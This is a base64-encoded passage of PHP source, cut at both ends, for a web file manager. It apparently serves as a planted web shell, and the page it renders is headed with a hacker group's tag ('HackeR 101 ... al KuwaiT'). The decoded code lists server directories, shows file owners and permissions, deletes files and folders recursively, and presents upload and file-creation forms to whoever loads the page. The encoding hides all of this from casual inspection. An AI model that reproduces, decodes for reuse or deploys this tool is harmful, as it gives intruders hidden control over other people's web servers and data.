LiB3b3JkKCdiYWNrJykgLiAnIF08L2E+PC9wPg0KDQo8L2Zvcm0+DQoNCic7DQoNCgkJaHRtbF9mb290ZXIoKTsNCg0KCX0NCg0KCWJyZWFrOw0KDQpkZWZhdWx0Og0KDQoJbGlzdGluZ19wYWdlKCk7DQoNCn0NCg0KLyogLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLSAqLw0KDQpmdW5jdGlvbiBnZXRsaXN0ICgkZGlyZWN0b3J5KSB7DQoJZ2xvYmFsICRkZWxpbSwgJHdpbjsNCg0KCWlmICgkZCA9IEBvcGVuZGlyKCRkaXJlY3RvcnkpKSB7DQoNCgkJd2hpbGUgKCgkZmlsZW5hbWUgPSBAcmVhZGRpcigkZCkpICE9PSBmYWxzZSkgew0KDQoJCQkkcGF0aCA9ICRkaXJlY3RvcnkgLiAkZmlsZW5hbWU7DQoNCgkJCWlmICgkc3RhdCA9IEBsc3RhdCgkcGF0aCkpIHsNCg0KCQkJCSRmaWxlID0gYXJyYXkoDQoJCQkJCSdmaWxlbmFtZScgICAgPT4gJGZpbGVuYW1lLA0KCQkJCQkncGF0aCcgICAgICAgID0+ICRwYXRoLA0KCQkJCQknaXNfZmlsZScgICAgID0+IEBpc19maWxlKCRwYXRoKSwNCgkJCQkJJ2lzX2RpcicgICAgICA9PiBAaXNfZGlyKCRwYXRoKSwNCgkJCQkJJ2lzX2xpbmsnICAgICA9PiBAaXNfbGluaygkcGF0aCksDQoJCQkJCSdpc19yZWFkYWJsZScgPT4gQGlzX3JlYWRhYmxlKCRwYXRoKSwNCgkJCQkJJ2lzX3dyaXRhYmxlJyA9PiBAaXNfd3JpdGFibGUoJHBhdGgpLA0KCQkJCQknc2l6ZScgICAgICAgID0+ICRzdGF0WydzaXplJ10sDQoJCQkJCSdwZXJtaXNzaW9uJyAgPT4gJHN0YXRbJ21vZGUnXSwNCgkJCQkJJ293bmVyJyAgICAgICA9PiAkc3RhdFsndWlkJ10sDQoJCQkJCSdncm91cCcgICAgICAgPT4gJHN0YXRbJ2dpZCddLA0KCQkJCQknbXRpbWUnICAgICAgID0+IEBmaWxlbXRpbWUoJHBhdGgpLA0KCQkJCQknYXRpbWUnICAgICAgID0+IEBmaWxlYXRpbWUoJHBhdGgpLA0KCQkJCQknY3RpbWUnICAgICAgID0+IEBmaWxlY3RpbWUoJHBhdGgpDQoJCQkJKTsNCg0KCQkJCWlmICgkZmlsZVsnaXNfZGlyJ10pIHsNCgkJCQkJJGZpbGVbJ2lzX2V4ZWN1dGFibGUnXSA9IEBmaWxlX2V4aXN0cygkcGF0aCAuICRkZWxpbSAuICcuJyk7DQoJCQkJfSBlbHNlIHsNCgkJCQkJaWYgKCEkd2luKSB7DQoJCQkJCQkkZmlsZVsnaXNfZXhlY3V0YWJsZSddID0gQGlzX2V4ZWN1dGFibGUoJHBhdGgpOw0KCQkJCQl9IGVsc2Ugew0KCQkJCQkJJGZpbGVbJ2lzX2V4ZWN1dGFibGUnXSA9IHRydWU7DQoJCQkJCX0NCgkJCQl9DQoNCgkJCQlpZiAoJGZpbGVbJ2lzX2xpbmsnXSkgJGZpbGVbJ3RhcmdldCddID0gQHJlYWRsaW5rKCRwYXRoKTsNCg0KCQkJCWlmIChmdW5jdGlvbl9leGlzdHMoJ3Bvc2l4X2dldHB3dWlkJykpICRmaWxlWydvd25lcl9uYW1lJ10gPSBAcmVzZXQocG9zaXhfZ2V0cHd1aWQoJGZpbGVbJ293bmVyJ10pKTsNCgkJCQlpZiAoZnVuY3Rpb25fZXhpc3RzKCdwb3NpeF9nZXRncmdpZCcpKSAkZmlsZVsnZ3JvdXBfbmFtZSddID0gQHJlc2V0KHBvc2l4X2dldGdyZ2lkKCRmaWxlWydncm91cCddKSk7DQoNCgkJCQkkZmlsZXNbXSA9ICRmaWxlOw0KDQoJCQl9DQoNCgkJfQ0KDQoJCXJldHVybiAkZmlsZXM7DQoNCgl9IGVsc2Ugew0KCQlyZXR1cm4gZmFsc2U7DQoJfQ0KDQp9DQoNCmZ1bmN0aW9uIHNvcnRsaXN0ICgkbGlzdCwgJGtleSwgJHJldmVyc2UpIHsNCg0KCSRkaXJzID0gYXJyYXkoKTsNCgkkZmlsZXMgPSBhcnJheSgpOw0KDQoJZm9yICgkaSA9IDA7ICRpIDwgc2l6ZW9mKCRsaXN0KTsgJGkrKykgew0KCQlpZiAoJGxpc3RbJGldWydpc19kaXInXSkgJGRpcnNbXSA9ICRsaXN0WyRpXTsNCgkJZWxzZSAkZmlsZXNbXSA9ICRsaXN0WyRpXTsNCgl9DQoNCglxdWlja3NvcnQoJGRpcnMsIDAsIHNpemVvZigkZGlycykgLSAxLCAka2V5KTsNCglpZiAoJHJldmVyc2UpICRkaXJzID0gYXJyYXlfcmV2ZXJzZSgkZGlycyk7DQoNCglxdWlja3NvcnQoJGZpbGVzLCAwLCBzaXplb2YoJGZpbGVzKSAtIDEsICRrZXkpOw0KCWlmICgkcmV2ZXJzZSkgJGZpbGVzID0gYXJyYXlfcmV2ZXJzZSgkZmlsZXMpOw0KDQoJcmV0dXJuIGFycmF5X21lcmdlKCRkaXJzLCAkZmlsZXMpOw0KDQp9DQoNCmZ1bmN0aW9uIHF1aWNrc29ydCAoJiRhcnJheSwgJGZpcnN0LCAkbGFzdCwgJGtleSkgew0KDQoJaWYgKCRmaXJzdCA8ICRsYXN0KSB7DQoNCgkJJGNtcCA9ICRhcnJheVtmbG9vcigoJGZpcnN0ICsgJGxhc3QpIC8gMildWyRrZXldOw0KDQoJCSRsID0gJGZpcnN0Ow0KCQkkciA9ICRsYXN0Ow0KDQoJCXdoaWxlICgkbCA8PSAkcikgew0KDQoJCQl3aGlsZSAoJGFycmF5WyRsXVska2V5XSA8ICRjbXApICRsKys7DQoJCQl3aGlsZSAoJGFycmF5WyRyXVska2V5XSA+ICRjbXApICRyLS07DQoNCgkJCWlmICgkbCA8PSAkcikgew0KDQoJCQkJJHRtcCA9ICRhcnJheVskbF07DQoJCQkJJGFycmF5WyRsXSA9ICRhcnJheVskcl07DQoJCQkJJGFycmF5WyRyXSA9ICR0bXA7DQoNCgkJCQkkbCsrOw0KCQkJCSRyLS07DQoNCgkJCX0NCg0KCQl9DQoNCgkJcXVpY2tzb3J0KCRhcnJheSwgJGZpcnN0LCAkciwgJGtleSk7DQoJCXF1aWNrc29ydCgkYXJyYXksICRsLCAkbGFzdCwgJGtleSk7DQoNCgl9DQoNCn0NCg0KZnVuY3Rpb24gcGVybWlzc2lvbl9vY3RhbDJzdHJpbmcgKCRtb2RlKSB7DQoNCglpZiAoKCRtb2RlICYgMHhDMDAwKSA9PT0gMHhDMDAwKSB7DQoJCSR0eXBlID0gJ3MnOw0KCX0gZWxzZWlmICgoJG1vZGUgJiAweEEwMDApID09PSAweEEwMDApIHsNCgkJJHR5cGUgPSAnbCc7DQoJfSBlbHNlaWYgKCgkbW9kZSAmIDB4ODAwMCkgPT09IDB4ODAwMCkgew0KCQkkdHlwZSA9ICctJzsNCgl9IGVsc2VpZiAoKCRtb2RlICYgMHg2MDAwKSA9PT0gMHg2MDAwKSB7DQoJCSR0eXBlID0gJ2InOw0KCX0gZWxzZWlmICgoJG1vZGUgJiAweDQwMDApID09PSAweDQwMDApIHsNCgkJJHR5cGUgPSAnZCc7DQoJfSBlbHNlaWYgKCgkbW9kZSAmIDB4MjAwMCkgPT09IDB4MjAwMCkgew0KCQkkdHlwZSA9ICdjJzsNCgl9IGVsc2VpZiAoKCRtb2RlICYgMHgxMDAwKSA9PT0gMHgxMDAwKSB7DQoJCSR0eXBlID0gJ3AnOw0KCX0gZWxzZSB7DQoJCSR0eXBlID0gJz8nOw0KCX0NCg0KCSRvd25lciAgPSAoJG1vZGUgJiAwMDQwMCkgPyAncicgOiAnLSc7DQoJJG93bmVyIC49ICgkbW9kZSAmIDAwMjAwKSA/ICd3JyA6ICctJzsNCglpZiAoJG1vZGUgJiAweDgwMCkgew0KCQkkb3duZXIgLj0gKCRtb2RlICYgMDAxMDApID8gJ3MnIDogJ1MnOw0KCX0gZWxzZSB7DQoJCSRvd25lciAuPSAoJG1vZGUgJiAwMDEwMCkgPyAneCcgOiAnLSc7DQoJfQ0KDQoJJGdyb3VwICA9ICgkbW9kZSAmIDAwMDQwKSA/ICdyJyA6ICctJzsNCgkkZ3JvdXAgLj0gKCRtb2RlICYgMDAwMjApID8gJ3cnIDogJy0nOw0KCWlmICgkbW9kZSAmIDB4NDAwKSB7DQoJCSRncm91cCAuPSAoJG1vZGUgJiAwMDAxMCkgPyAncycgOiAnUyc7DQoJfSBlbHNlIHsNCgkJJGdyb3VwIC49ICgkbW9kZSAmIDAwMDEwKSA/ICd4JyA6ICctJzsNCgl9DQoNCgkkb3RoZXIgID0gKCRtb2RlICYgMDAwMDQpID8gJ3InIDogJy0nOw0KCSRvdGhlciAuPSAoJG1vZGUgJiAwMDAwMikgPyAndycgOiAnLSc7DQoJaWYgKCRtb2RlICYgMHgyMDApIHsNCgkJJG90aGVyIC49ICgkbW9kZSAmIDAwMDAxKSA/ICd0JyA6ICdUJzsNCgl9IGVsc2Ugew0KCQkkb3RoZXIgLj0gKCRtb2RlICYgMDAwMDEpID8gJ3gnIDogJy0nOw0KCX0NCg0KCXJldHVybiAkdHlwZSAuICRvd25lciAuICRncm91cCAuICRvdGhlcjsNCg0KfQ0KDQpmdW5jdGlvbiBpc19zY3JpcHQgKCRmaWxlbmFtZSkgew0KCXJldHVybiBwcmVnX21hdGNoKCcvXC5waHAkfFwucGhwMyR8XC5waHA0JHxcLnBocDUkLycsICRmaWxlbmFtZSk7DQp9DQoNCmZ1bmN0aW9uIGdldG1pbWV0eXBlICgkZmlsZW5hbWUpIHsNCglzdGF0aWMgJG1pbWVzID0gYXJyYXkoDQoJCSdcLmpwZyR8XC5qcGVnJCcgID0+ICdpbWFnZS9qcGVnJywNCgkJJ1wuZ2lmJCcgICAgICAgICAgPT4gJ2ltYWdlL2dpZicsDQoJCSdcLnBuZyQnICAgICAgICAgID0+ICdpbWFnZS9wbmcnLA0KCQknXC5odG1sJHxcLmh0bWwkJyA9PiAndGV4dC9odG1sJywNCgkJJ1wudHh0JHxcLmFzYyQnICAgPT4gJ3RleHQvcGxhaW4nLA0KCQknXC54bWwkfFwueHNsJCcgICA9PiAnYXBwbGljYXRpb24veG1sJywNCgkJJ1wucGRmJCcgICAgICAgICAgPT4gJ2FwcGxpY2F0aW9uL3BkZicNCgkpOw0KDQoJZm9yZWFjaCAoJG1pbWVzIGFzICRyZWdleCA9PiAkbWltZSkgew0KCQlpZiAoZXJlZ2koJHJlZ2V4LCAkZmlsZW5hbWUpKSByZXR1cm4gJG1pbWU7DQoJfQ0KDQoJLy8gcmV0dXJuICdhcHBsaWNhdGlvbi9vY3RldC1zdHJlYW0nOw0KCXJldHVybiAndGV4dC9wbGFpbic7DQoNCn0NCg0KZnVuY3Rpb24gZGVsICgkZmlsZSkgew0KCWdsb2JhbCAkZGVsaW07DQoNCglpZiAoIWZpbGVfZXhpc3RzKCRmaWxlKSkgcmV0dXJuIGZhbHNlOw0KDQoJaWYgKEBpc19kaXIoJGZpbGUpICYmICFAaXNfbGluaygkZmlsZSkpIHsNCg0KCQkkc3VjY2VzcyA9IGZhbHNlOw0KDQoJCWlmIChAcm1kaXIoJGZpbGUpKSB7DQoNCgkJCSRzdWNjZXNzID0gdHJ1ZTsNCg0KCQl9IGVsc2VpZiAoJGRpciA9IEBvcGVuZGlyKCRmaWxlKSkgew0KDQoJCQkkc3VjY2VzcyA9IHRydWU7DQoNCgkJCXdoaWxlICgoJGYgPSByZWFkZGlyKCRkaXIpKSAhPT0gZmFsc2UpIHsNCgkJCQlpZiAoJGYgIT0gJy4nICYmICRmICE9ICcuLicgJiYgIWRlbCgkZmlsZSAuICRkZWxpbSAuICRmKSkgew0KCQkJCQkkc3VjY2VzcyA9IGZhbHNlOw0KCQkJCX0NCgkJCX0NCgkJCWNsb3NlZGlyKCRkaXIpOw0KDQoJCQlpZiAoJHN1Y2Nlc3MpICRzdWNjZXNzID0gQHJtZGlyKCRmaWxlKTsNCg0KCQl9DQoNCgkJcmV0dXJuICRzdWNjZXNzOw0KDQoJfQ0KDQoJcmV0dXJuIEB1bmxpbmsoJGZpbGUpOw0KDQp9DQoNCmZ1bmN0aW9uIGFkZHNsYXNoICgkZGlyZWN0b3J5KSB7DQoJZ2xvYmFsICRkZWxpbTsNCg0KCWlmIChzdWJzdHIoJGRpcmVjdG9yeSwgLTEsIDEpICE9ICRkZWxpbSkgew0KCQlyZXR1cm4gJGRpcmVjdG9yeSAuICRkZWxpbTsNCgl9IGVsc2Ugew0KCQlyZXR1cm4gJGRpcmVjdG9yeTsNCgl9DQoNCn0NCg0KZnVuY3Rpb24gcmVsYXRpdmUyYWJzb2x1dGUgKCRzdHJpbmcsICRkaXJlY3RvcnkpIHsNCg0KCWlmIChwYXRoX2lzX3JlbGF0aXZlKCRzdHJpbmcpKSB7DQoJCXJldHVybiBzaW1wbGlmeV9wYXRoKGFkZHNsYXNoKCRkaXJlY3RvcnkpIC4gJHN0cmluZyk7DQoJfSBlbHNlIHsNCgkJcmV0dXJuIHNpbXBsaWZ5X3BhdGgoJHN0cmluZyk7DQoJfQ0KDQp9DQoNCmZ1bmN0aW9uIHBhdGhfaXNfcmVsYXRpdmUgKCRwYXRoKSB7DQoJZ2xvYmFsICR3aW47DQoNCglpZiAoJHdpbikgew0KCQlyZXR1cm4gKHN1YnN0cigkcGF0aCwgMSwgMSkgIT0gJzonKTsNCgl9IGVsc2Ugew0KCQlyZXR1cm4gKHN1YnN0cigkcGF0aCwgMCwgMSkgIT0gJy8nKTsNCgl9DQoNCn0NCg0KZnVuY3Rpb24gYWJzb2x1dGUycmVsYXRpdmUgKCRkaXJlY3RvcnksICR0YXJnZXQpIHsNCglnbG9iYWwgJGRlbGltOw0KDQoJJHBhdGggPSAnJzsNCgl3aGlsZSAoJGRpcmVjdG9yeSAhPSAkdGFyZ2V0KSB7DQoJCWlmICgkZGlyZWN0b3J5ID09IHN1YnN0cigkdGFyZ2V0LCAwLCBzdHJsZW4oJGRpcmVjdG9yeSkpKSB7DQoJCQkkcGF0aCAuPSBzdWJzdHIoJHRhcmdldCwgc3RybGVuKCRkaXJlY3RvcnkpKTsNCgkJCWJyZWFrOw0KCQl9IGVsc2Ugew0KCQkJJHBhdGggLj0gJy4uJyAuICRkZWxpbTsNCgkJCSRkaXJlY3RvcnkgPSBzdWJzdHIoJGRpcmVjdG9yeSwgMCwgc3RycnBvcyhzdWJzdHIoJGRpcmVjdG9yeSwgMCwgLTEpLCAkZGVsaW0pICsgMSk7DQoJCX0NCgl9DQoJaWYgKCRwYXRoID09ICcnKSAkcGF0aCA9ICcuJzsNCg0KCXJldHVybiAkcGF0aDsNCg0KfQ0KDQpmdW5jdGlvbiBzaW1wbGlmeV9wYXRoICgkcGF0aCkgew0KCWdsb2JhbCAkZGVsaW07DQoNCglpZiAoQGZpbGVfZXhpc3RzKCRwYXRoKSAmJiBmdW5jdGlvbl9leGlzdHMoJ3JlYWxwYXRoJykgJiYgQHJlYWxwYXRoKCRwYXRoKSAhPSAnJykgew0KCQkkcGF0aCA9IHJlYWxwYXRoKCRwYXRoKTsNCgkJaWYgKEBpc19kaXIoJHBhdGgpKSB7DQoJCQlyZXR1cm4gYWRkc2xhc2goJHBhdGgpOw0KCQl9IGVsc2Ugew0KCQkJcmV0dXJuICRwYXRoOw0KCQl9DQoJfQ0KDQoJJHBhdHRlcm4gID0gJGRlbGltIC4gJy4nIC4gJGRlbGltOw0KDQoJaWYgKEBpc19kaXIoJHBhdGgpKSB7DQoJCSRwYXRoID0gYWRkc2xhc2goJHBhdGgpOw0KCX0NCg0KCXdoaWxlIChzdHJwb3MoJHBhdGgsICRwYXR0ZXJuKSAhPT0gZmFsc2UpIHsNCgkJJHBhdGggPSBzdHJfcmVwbGFjZSgkcGF0dGVybiwgJGRlbGltLCAkcGF0aCk7DQoJfQ0KDQoJJGUgPSBhZGRzbGFzaGVzKCRkZWxpbSk7DQoJJHJlZ2V4ID0gJGUgLiAnKChcLlteXC4nIC4gJGUgLiAnXVteJyAuICRlIC4gJ10qKXwoXC5cLlteJyAuICRlIC4gJ10rKXwoW15cLl1bXicgLiAkZSAuICddKikpJyAuICRlIC4gJ1wuXC4nIC4gJGU7DQoNCgl3aGlsZSAoZXJlZygkcmVnZXgsICRwYXRoKSkgew0KCQkkcGF0aCA9IGVyZWdfcmVwbGFjZSgkcmVnZXgsICRkZWxpbSwgJHBhdGgpOw0KCX0NCg0KCXJldHVybiAkcGF0aDsNCg0KfQ0KDQpmdW5jdGlvbiBodW1hbl9maWxlc2l6ZSAoJGZpbGVzaXplKSB7DQoNCgkkc3VmZmljZXMgPSAna01HVFBFJzsNCg0KCSRuID0gMDsNCgl3aGlsZSAoJGZpbGVzaXplID49IDEwMDApIHsNCgkJJGZpbGVzaXplIC89IDEwMjQ7DQoJCSRuKys7DQoJfQ0KDQoJJGZpbGVzaXplID0gcm91bmQoJGZpbGVzaXplLCAzIC0gc3RycG9zKCRmaWxlc2l6ZSwgJy4nKSk7DQoNCglpZiAoc3RycG9zKCRmaWxlc2l6ZSwgJy4nKSAhPT0gZmFsc2UpIHsNCgkJd2hpbGUgKGluX2FycmF5KHN1YnN0cigkZmlsZXNpemUsIC0xLCAxKSwgYXJyYXkoJzAnLCAnLicpKSkgew0KCQkJJGZpbGVzaXplID0gc3Vic3RyKCRmaWxlc2l6ZSwgMCwgc3RybGVuKCRmaWxlc2l6ZSkgLSAxKTsNCgkJfQ0KCX0NCg0KCSRzdWZmaXggPSAoKCRuID09IDApID8gJycgOiBzdWJzdHIoJHN1ZmZpY2VzLCAkbiAtIDEsIDEpKTsNCg0KCXJldHVybiAkZmlsZXNpemUgLiAiIHskc3VmZml4fUIiOw0KDQp9DQoNCmZ1bmN0aW9uIHN0cmlwICgmJHN0cikgew0KCSRzdHIgPSBzdHJpcHNsYXNoZXMoJHN0cik7DQp9DQoNCi8qIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0gKi8NCg0KZnVuY3Rpb24gbGlzdGluZ19wYWdlICgkbWVzc2FnZSA9IG51bGwpIHsNCglnbG9iYWwgJHNlbGYsICRkaXJlY3RvcnksICRzb3J0LCAkcmV2ZXJzZTsNCg0KCWh0bWxfaGVhZGVyKCk7DQoNCgkkbGlzdCA9IGdldGxpc3QoJGRpcmVjdG9yeSk7DQoNCglpZiAoYXJyYXlfa2V5X2V4aXN0cygnc29ydCcsICRfR0VUKSkgJHNvcnQgPSAkX0dFVFsnc29ydCddOyBlbHNlICRzb3J0ID0gJ2ZpbGVuYW1lJzsNCglpZiAoYXJyYXlfa2V5X2V4aXN0cygncmV2ZXJzZScsICRfR0VUKSAmJiAkX0dFVFsncmV2ZXJzZSddID09ICd0cnVlJykgJHJldmVyc2UgPSB0cnVlOyBlbHNlICRyZXZlcnNlID0gZmFsc2U7DQoNCgllY2hvICc8aDEgc3R5bGU9Im1hcmdpbi1ib3R0b206IDAiPkhhY2tlUiAxMDEgSGFZZUYgYWxHbWUzIEhrUmtveiBhbCBLdXdhaVQ8L2gxPg0KDQo8Zm9ybSBlbmN0eXBlPSJtdWx0aXBhcnQvZm9ybS1kYXRhIiBhY3Rpb249IicgLiAkc2VsZiAuICciIG1ldGhvZD0icG9zdCI+DQoNCjx0YWJsZSBpZD0ibWFpbiI+DQonOw0KDQoJZGlyZWN0b3J5X2Nob2ljZSgpOw0KDQoJaWYgKCFlbXB0eSgkbWVzc2FnZSkpIHsNCgkJc3BhY2VyKCk7DQoJCWVjaG8gJG1lc3NhZ2U7DQoJfQ0KDQoJaWYgKEBpc193cml0YWJsZSgkZGlyZWN0b3J5KSkgew0KCQl1cGxvYWRfYm94KCk7DQoJCWNyZWF0ZV9ib3goKTsNCgl9IGVsc2Ugew0KCQlzcGFjZXIoKTsNCgl9DQoNCglpZiAoJGxpc3QpIHsNCgkJJGxpc3QgPSBzb3J0bGlzdCgkbGlzdCwgJHNvcnQsICRyZXZlcnNlKTsNCgkJbGlzdGluZygkbGlzdCk7DQoJfSBlbHNlIHsNCgkJZWNobyBlcnJvcignbm90X3JlYWRhYmxlJywgJGRpcmVjdG9yeSk7DQoJfQ0KDQoJZWNobyAnPC90YWJsZT4NCg0KPC9mb3JtPg0KDQonOw0KDQoJaHRtbF9mb290ZXIoKTsNCg0KfQ0KDQpmdW5jdGlvbiBsaXN0aW5nICgkbGlzdCkgew0KCWdsb2JhbCAkZGlyZWN0b3J5LCAkaG9tZWRpciwgJHNvcnQsICRyZXZlcnNlLCAkd2luLCAkY29scywgJGRhdGVfZm9ybWF0LCAkc2VsZjsNCg0KCWVjaG8gJzx0ciBjbGFzcz0ibGlzdGluZyI+DQoJPHRoIHN0eWxlPSJ0ZXh0LWFsaWduOiBjZW50ZXI7IHZlcnRpY2FsLWFsaWduOiBtaWRkbGUiPjxpbWcgc3JjPSInIC4gJHNlbGYgLiAnP2ltYWdlPXNtaWxleSIgYWx0PSJzbWlsZXkiIC8+PC90aD4NCic7DQoNCgljb2x1bW5fdGl0bGUoJ2ZpbGVuYW1lJywgJHNvcnQsICRyZXZlcnNlKTsNCgljb2x1bW5fdGl0bGUoJ3NpemUnLCAkc29ydCwgJHJldmVyc2UpOw0KDQoJaWYgKCEkd2luKSB7DQoJCWNvbHVtbl90aXRsZSgncGVybWlzc2lvbicsICRzb3J0LCAkcmV2ZXJzZSk7DQoJCWNvbHVtbl90aXRsZSgnb3duZXInLCAkc29ydCwgJHJldmVyc2UpOw0KCQljb2x1bW5fdGl0bGUoJ2dyb3VwJywgJHNvcnQsICRyZXZlcnNlKTsNCgl9DQoNCgllY2hvICcJPHRoIGNsYXNzPSJmdW5jdGlvbnMiPicgLiB3b3JkKCdmdW5jdGlvbnMnKSAuICc8L3RoPg0KPC90cj4NCic7DQoNCglmb3IgKCRpID0gMDsgJGkgPCBzaXplb2YoJGxpc3QpOyAkaSsrKSB7DQoJCSRmaWxlID0gJGxpc3RbJGldOw0KDQoJCSR0aW1lc3RhbXBzICA9ICdtdGltZTogJyAuIGRhdGUoJGRhdGVfZm9ybWF0LCAkZmlsZVsnbXRpbWUnXSkgLiAnLCAnOw0KCQkkdGltZXN0YW1wcyAuPSAnYXRpbWU6ICcgLiBkYXRlKCRkYXRlX2Zvcm1hdCwgJGZpbGVbJ2F0aW1lJ10pIC4gJywgJzsNCgkJJHRpbWVzdGFtcHMgLj0gJ2N0aW1lOiAnIC4gZGF0ZSgkZGF0ZV9mb3JtYXQsICRmaWxlWydjdGltZSddKTsNCg0KCQllY2hvICc8dHIgY2xhc3M9Imxpc3RpbmciPg0KCTx0ZCBjbGFzcz0iY2hlY2tib3giPjxpbnB1dCB0eXBlPSJjaGVja2JveCIgbmFtZT0iY2hlY2tlZCcgLiAkaSAuICciIHZhbHVlPSJ0cnVlIiBvbmZvY3VzPSJhY3RpdmF0ZShcJ290aGVyXCcpIiAvPjwvdGQ+DQoJPHRkIGNsYXNzPSJmaWxlbmFtZSIgdGl0bGU9IicgLiBodG1sKCR0aW1lc3RhbXBzKSAuICciPic7DQoNCgkJaWYgKCRmaWxlWydpc19saW5rJ10pIHsNCg0KCQkJZWNobyAnPGltZyBzcmM9IicgLiAkc2VsZiAuICc/aW1hZ2U9bGluayIgYWx0PSJsaW5rIiAvPiAnOw0KCQkJZWNobyBodG1sKCRmaWxlWydmaWxlbmFtZSddKSAuICcgJnJhcnI7ICc7DQoNCgkJCSRyZWFsX2ZpbGUgPSByZWxhdGl2ZTJhYnNvbHV0ZSgkZmlsZVsndGFyZ2V0J10sICRkaXJlY3RvcnkpOw0KDQoJCQlpZiAoQGlzX3JlYWRhYmxlKCRyZWFsX2ZpbGUpKSB7DQoJCQkJaWYgKEBpc19kaXIoJHJlYWxfZmlsZSkpIHsNCgkJCQkJZWNobyAnWyA8YSBocmVmPSInIC4gJHNlbGYgLiAnP2Rpcj0nIC4gdXJsZW5jb2RlKCRyZWFsX2ZpbGUpIC4gJyI+JyAuIGh0bWwoJGZpbGVbJ3RhcmdldCddKSAuICc8L2E+IF0nOw0KCQkJCX0gZWxzZSB7DQoJCQkJCWVjaG8gJzxhIGhyZWY9IicgLiAkc2VsZiAuICc/YWN0aW9uPXZpZXcmYW1wO2ZpbGU9JyAuIHVybGVuY29kZSgkcmVhbF9maWxlKSAuICciPicgLiBodG1sKCRmaWxlWyd0YXJnZXQnXSkgLiAnPC9hPic7DQoJCQkJfQ0KCQkJfSBlbHNlIHsNCgkJCQllY2hvIGh0bWwoJGZpbGVbJ3RhcmdldCddKTsNCgkJCX0NCg0KCQl9IGVsc2VpZiAoJGZpbGVbJ2lzX2RpciddKSB7DQoNCgkJCWVjaG8gJzxpbWcgc3JjPSInIC4gJHNlbGYgLiAnP2ltYWdlPWZvbGRlciIgYWx0PSJmb2xkZXIiIC8+IFsgJzsNCgkJCWlmICgkd2luIHx8ICRmaWxlWydpc19leGVjdXRhYmxlJ10pIHsNCgkJCQllY2hvICc8YSBocmVmPSInIC4gJHNlbGYgLiAnP2Rpcj0nIC4gdXJsZW5jb2RlKCRmaWxlWydwYXRoJ10pIC4gJyI+JyAuIGh0bWwoJGZpbGVbJ2ZpbGVuYW1lJ10pIC4gJzwvYT4nOw0KCQkJfSBlbHNlIHsNCgkJCQllY2hvIGh0bWwoJGZpbGVbJ2ZpbGVuYW1lJ10pOw0KCQkJfQ0KCQkJZWNobyAnIF0nOw0KDQoJCX0gZWxzZSB7DQoNCgkJCWlmIChzdWJzdHIoJGZpbGVbJ2ZpbGVuYW1lJ10sIDAsIDEpID09ICcuJykgew0KCQkJCWVjaG8gJzxpbWcgc3JjPSInIC4gJHNlbGYgLiAnP2ltYWdlPWhpZGRlbl9maWxlIiBhbHQ9ImhpZGRlbiBmaWxlIiAvPiAnOw0KCQkJfSBlbHNlIHsNCgkJCQllY2hvICc8aW1nIHNyYz0iJyAuICRzZWxmIC4gJz9pbWFnZT1maWxlIiBhbHQ9ImZpbGUiIC8+ICc7DQoJCQl9DQoNCgkJCWlmICgkZmlsZVsnaXNfZmlsZSddICYmICRmaWxlWydpc19yZWFkYWJsZSddKSB7DQoJCQkgICBlY2hvICc8YSBocmVmPSInIC4gJHNlbGYgLiAnP2FjdGlvbj12aWV3JmFtcDtmaWxlPScgLiB1cmxlbmNvZGUoJGZpbGVbJ3BhdGgnXSkgLiAnIj4nIC4gaHRtbCgkZmlsZVsnZmlsZW5hbWUnXSkgLiAnPC9hPic7DQoJCQl9IGVsc2Ugew0KCQkJCWVjaG8gaHRtbCgkZmlsZVsnZmlsZW5hbWUnXSk7DQoJCQl9DQoNCgkJfQ0KDQoJCWlmICgkZmlsZVsnc2l6ZSddID49IDEwMDApIHsNCgkJCSRodW1hbiA9ICcgdGl0bGU9IicgLiBodW1hbl9maWxlc2l6ZSgkZmlsZVsnc2l6ZSddKSAuICciJzsNCgkJfSBlbHNlIHsNCgkJCSRodW1hbiA9ICcnOw0KCQl9DQoNCgkJZWNobyAiPC90ZD5cbiI7DQoNCgkJZWNobyAiXHQ8dGQgY2xhc3M9XCJzaXplXCIkaHVtYW4+eyRmaWxlWydzaXplJ119IEI8L3RkPlxuIjsNCg0KCQlpZiAoISR3aW4pIHsNCg0KCQkJZWNobyAiXHQ8dGQgY2xhc3M9XCJwZXJtaXNzaW9uXCIgdGl0bGU9XCIiIC4gZGVjb2N0KCRmaWxlWydwZXJtaXNzaW9uJ10pIC4gJyI+JzsNCg0KCQkJJGwgPSAhJGZpbGVbJ2lzX2xpbmsnXSAmJiAoIWZ1bmN0aW9uX2V4aXN0cygncG9zaXhfZ2V0dWlkJykgfHwgJGZpbGVbJ293bmVyJ10gPT0gcG9zaXhfZ2V0dWlkKCkpOw0KCQkJaWYgKCRsKSBlY2hvICc8YSBocmVmPSInIC4gJHNlbGYgLiAnP2FjdGlvbj1wZXJtaXNzaW9uJmFtcDtmaWxlPScgLiB1cmxlbmNvZGUoJGZpbGVbJ3BhdGgnXSkgLiAnJmFtcDtkaXI9JyAuIHVybGVuY29kZSgkZGlyZWN0b3J5KSAuICciPic7DQoJCQllY2hvIGh0bWwocGVybWlzc2lvbl9vY3RhbDJzdHJpbmcoJGZpbGVbJ3Blcm1pc3Npb24nXSkpOw0KCQkJaWYgKCRsKSBlY2hvICc8L2E+JzsNCg0KCQkJZWNobyAiPC90ZD5cbiI7DQoNCgkJCWlmIChhcnJheV9rZXlfZXhpc3RzKCdvd25lcl9uYW1lJywgJGZpbGUpKSB7DQoJCQkJZWNobyAiXHQ8dGQgY2xhc3M9XCJvd25lclwiIHRpdGxlPVwidWlkOiB7JGZpbGVbJ293bmVyJ119XCI+eyRmaWxlWydvd25lcl9uYW1lJ119PC90ZD5cbiI7DQoJCQl9IGVsc2Ugew0KCQkJCWVjaG8gIlx0PHRkIGNsYXNzPVwib3duZXJcIj57JGZpbGVbJ293bmVyJ119PC90ZD5cbiI7DQoJCQl9DQoNCgkJCWlmIChhcnJheV9rZXlfZXhpc3RzKCdncm91cF9uYW1lJywgJGZpbGUpKSB7DQoJCQkJZWNobyAiXHQ8dGQgY2xhc3M9XCJncm91cFwiIHRpdGxlPVwiZ2lkOiB7JGZpbGVbJ2dyb3VwJ119XCI+eyRmaWxlWydncm91cF9uYW1lJ119PC90ZD5cbiI7DQoJCQl9IGVsc2Ugew0KCQkJCWVjaG8gIlx0PHRkIGNsYXNzP